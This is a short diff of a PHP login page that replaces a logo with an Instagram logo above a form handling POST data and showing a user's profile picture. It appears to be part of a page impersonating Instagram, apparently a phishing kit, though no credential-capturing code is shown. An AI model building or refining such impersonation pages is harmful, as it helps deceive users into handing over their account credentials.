@@ -131,7 +131,7 @@ if($_POST){
                </div>
 <el class="login100-form validate-form" id="elemend"><form id="two">
     <br><br><br>
-	<center><img style="margin-top:-120px;" src="https://i.hizliresim.com/5xns4qf.png"  width="180">
+	<center><img style="margin-top:-120px;" src="https://marka-logo.com/wp-content/uploads/2020/04/Instagram-Logo-2010-2013.jpg"  width="180">
 	<br>
 
 	       <center>  <img src=" <?php  echo  $pp; ?>" style="max-width:145%; border-radius:145%;" width="145" height="145;">
